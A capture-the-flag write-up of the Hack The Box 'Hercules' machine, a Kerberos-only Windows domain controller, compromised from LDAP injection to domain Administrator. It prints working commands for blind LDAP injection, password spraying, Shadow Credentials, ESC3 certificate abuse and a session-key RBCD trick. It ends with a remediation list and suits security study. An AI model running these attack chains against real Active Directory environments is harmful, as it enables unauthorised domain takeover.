---
title: HTB Hercules
slug: htb-hercules-writeup
type: writeup
category: htb
date: 2026-02-12
difficulty: insane
os: windows
readTime: 13 min read
points: 80
tags: [AD, ADCS, KERBEROS]
classification: CLASSIFIED-WHITE
summary: NTLM-disabled Kerberos-only DC. LDAP blind injection via double URL-encoding extracts `johnathan.j`'s description — a live password. Spray into `ken.w`, coerce + crack to `natalie.a`, Shadow-Creds across `bob.w` → move `Auditor` between OUs → Shadow-Creds `auditor`. Forest Migration OU `GenericAll` + ESC3 Enrollment Agent → `ashley.b` → a scheduled `aCleanup.ps1` reflows ACL inheritance, activating IIS_Administrator. Final step is Tiraniddo RBCD on `IIS_WEBSERVER$` (a user account, no SPNs) — swap NT hash for the TGT session key, run `S4U2Self+U2U+S4U2Proxy`, impersonate Administrator.
engagement:
  platform: Hack The Box
  target: hercules.htb
  ref: 10.129.13.203
  duration: 13 min read
  operator: WDD-01
killchain:
  - { stage: LDAPi,    sub: "double URL-encode %252A", tag: BLIND,   color: warn }
  - { stage: SPRAY,    sub: "description → ken.w",    tag: NETEXEC, color: warn }
  - { stage: SHADOW,   sub: "natalie.a → bob.w → auditor", tag: CERTIPY, color: warn }
  - { stage: ESC3,     sub: "fernando.r agent → ashley.b", tag: ADCS, color: warn }
  - { stage: CLEANUP,  sub: "aCleanup.ps1 → IIS_Administrator", tag: ACL, color: warn }
  - { stage: ROOT,     sub: "Tiraniddo RBCD + U2U",   tag: GOAL,    color: ok }
loadout:
  - { tool: nmap,        purpose: recon }
  - { tool: curl,        purpose: ldapi }
  - { tool: netexec,     purpose: spray }
  - { tool: certipy-ad,  purpose: shadow + esc3 }
  - { tool: bloodyAD,    purpose: ace-flip }
  - { tool: impacket,    purpose: kerberos }
  - { tool: evil-winrm,  purpose: shell }
remediation:
  - Never echo LDAP search oracles to clients — a single bit of reflection is an exfil channel
  - Validate LDAP input server-side; regex blacklists are broken by double URL-encoding under IIS
  - Scope `GenericWrite` and `WriteAccountRestrictions` ACEs tightly; Shadow Credentials need only `msDS-KeyCredentialLink`
  - Disable ESC3 template enrollment for non-trusted issuance accounts
  - Audit ACL inheritance flips triggered by scheduled tasks
  - Enforce `TRUSTED_TO_AUTH_FOR_DELEGATION` and SPN requirements on RBCD-eligible accounts
---

::: stage n=1 label="LDAPi" title="Double URL-encode past the regex blacklist."

The `/Login` SSO page rejects `*`, `(`, `)`, `|`, `&`, `=`, `\`, `<`, `>`. But `%` is allowed — and IIS cheerfully URL-decodes {warn:twice}. `%252A` slips through the regex, arrives at the app as `%2A`, decodes to `*`:

::: terminal title="shell · operator@kali" lang="bash"
$ curl -sk 'https://hercules.htb/Login' \
    -d 'Username=%252A&Password=test'
Login attempt failed.

$ curl -sk 'https://hercules.htb/Login' \
    -d 'Username=johnathan.j&Password=test'
Invalid login attempt.
:::

Two different responses = a blind-LDAP oracle. "Login attempt failed" means the filter matched but password didn't; "Invalid login attempt" means the filter didn't match. Build a character-by-character extractor against the `description` attribute. The result:

```
johnathan.j → description: [REDACTED]
```

{red:That's not a warning — it's a password.}

:::

::: stage n=2 label="SPRAY" title="Description → ken.w."

::: terminal title="shell · netexec spray" lang="bash"
$ nxc smb dc.hercules.htb -u users.txt \
    -p '[REDACTED]' -k --continue-on-success
[+] hercules.htb\ken.w:[REDACTED]
:::

Only NTLM-disabled Kerberos, so every subsequent tool needs `-k`. From ken.w, coerce authentication and crack the captured NetNTLMv2 — `natalie.a:[REDACTED]`.

:::

::: stage n=3 label="SHADOW" title="Shadow Credentials ladder — natalie → bob → auditor."

natalie.a's Web Support group has `GenericWrite` on Web Department. `certipy-ad shadow auto` writes `msDS-KeyCredentialLink` and authenticates via PKINIT:

::: terminal title="shell · certipy · bob.w" lang="bash"
$ certipy-ad shadow auto -u natalie.a@hercules.htb -k \
    -target dc.hercules.htb -account bob.w -dc-ip $IP
[+] Saved bob.w.ccache
[+] NT hash: [REDACTED]
:::

bob.w has `WRITE` on Security + Web Department OUs. Drag `Auditor` across the fence:

::: terminal title="shell · ldap3 · move OU" lang="python"
conn.modify_dn(
  'CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb',
  'CN=Auditor',
  new_superior='OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
)
:::

Now natalie's OU-level `GenericWrite` reaches Auditor. Shadow Creds again:

::: terminal title="shell · certipy · auditor" lang="bash"
$ certipy-ad shadow auto -u natalie.a@hercules.htb -k \
    -dc-host dc.hercules.htb -account auditor
[+] NT hash: [REDACTED]

$ export KRB5CCNAME=auditor.ccache
$ evil-winrm -i dc.hercules.htb -r HERCULES.HTB -S
*Evil-WinRM* PS> type C:\Users\auditor\Desktop\user.txt
:::

:::

::: stage n=4 label="ESC3" title="GenericAll on Forest Migration OU → ESC3 → ashley.b."

Grant auditor + IT Support `GenericAll` on the Forest Migration OU:

::: terminal title="shell · bloodyAD · kerberos" lang="bash"
$ bloodyAD --host dc.hercules.htb -d hercules.htb -k add genericAll \
    "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" auditor
$ bloodyAD --host dc.hercules.htb -d hercules.htb -k add genericAll \
    "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" "IT Support"
:::

Enable `fernando.r` by clearing the disabled bit in UAC, set a password, then run {warn:ESC3}: request an Enrollment Agent cert, then request an on-behalf-of cert for `ashley.b`:

::: terminal title="shell · certipy · ESC3" lang="bash"
$ certipy-ad req -u FERNANDO.R@hercules.htb -target dc.hercules.htb \
    -ca 'CA-HERCULES' -template 'EnrollmentAgent' -k -dcom

$ certipy-ad req -u FERNANDO.R@hercules.htb -target dc.hercules.htb \
    -ca 'CA-HERCULES' -template 'UserSignature' -k \
    -pfx fernando.r.pfx -on-behalf-of 'hercules\ASHLEY.B' -dcom

$ certipy-ad auth -pfx ashley.b.pfx -dc-ip $IP -domain hercules.htb
[+] ashley.b NT hash: [REDACTED]
:::

:::

::: stage n=5 label="CLEANUP" title="aCleanup.ps1 fires the ACL reflow → IIS_Administrator live."

ashley.b has a scheduled `aCleanup.ps1` on her desktop that triggers `Password Cleanup` — clears `adminCount` and {warn:re-enables ACL inheritance} across flagged admin objects. After that sweep, IT Support's `GenericAll` on the Forest Migration OU cascades down to `IIS_Administrator`:

::: terminal title="shell · ashley.b@hercules" lang="powershell"
PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
PS> Start-Sleep -Seconds 30
PS> Enable-ADAccount -Identity IIS_Administrator
PS> Set-ADAccountPassword -Identity IIS_Administrator `
      -NewPassword (ConvertTo-SecureString "[REDACTED]" -AsPlainText -Force) `
      -Reset
:::

:::

::: stage n=6 label="ROOT" title="Tiraniddo RBCD — session-key swap on a non-computer account."

`IIS_WEBSERVER$` is a {red:user} (not a computer), has no SPNs, and lacks `TRUSTED_TO_AUTH_FOR_DELEGATION`. Standard RBCD `S4U2Proxy` fails. The Tiraniddo trick: request a TGT for the account, yank its session key, then {warn:set the account's NT hash to equal that session key}. Now `S4U2Self+U2U+S4U2Proxy` succeeds.

::: terminal title="shell · impacket · Tiraniddo" lang="bash"
$ bloodyAD ... set password 'IIS_webserver$' '[REDACTED]'

$ getTGT.py 'hercules.htb/IIS_WEBSERVER$' -hashes :$NT_HASH -dc-ip $IP

$ SESSION_KEY=$(describeTicket.py IIS_WEBSERVER$.ccache \
    | grep 'Ticket Session Key' | awk '{print $NF}')

$ changepasswd.py -newhashes ":$SESSION_KEY" \
    "hercules.htb/IIS_WEBSERVER\$:[REDACTED]@dc.hercules.htb" -k

$ getST.py -u2u -impersonate Administrator \
    -spn "cifs/dc.hercules.htb" -k -no-pass \
    hercules.htb/IIS_WEBSERVER\$ -dc-ip $IP
:::

::: terminal title="shell · root" lang="bash"
$ export KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
$ wmiexec.py -k -no-pass hercules.htb/Administrator@dc.hercules.htb \
    'cmd /c type C:\Users\Admin\Desktop\root.txt'
<root flag>
:::

::: opsec
Six separate ACL or Kerberos weaknesses, each ordinary on its own — LDAP input reflection, password in description, Shadow Creds, OU move, ESC3, inheritance reflow, and finally a user-account RBCD. None are unusual in isolation. What makes Hercules insane is the scheduling: you need the cleanup script to run before IIS_Administrator's inheritance propagates, and the Tiraniddo session-key swap must precede any TGS request — if the TGT rolls you start over.
:::

:::
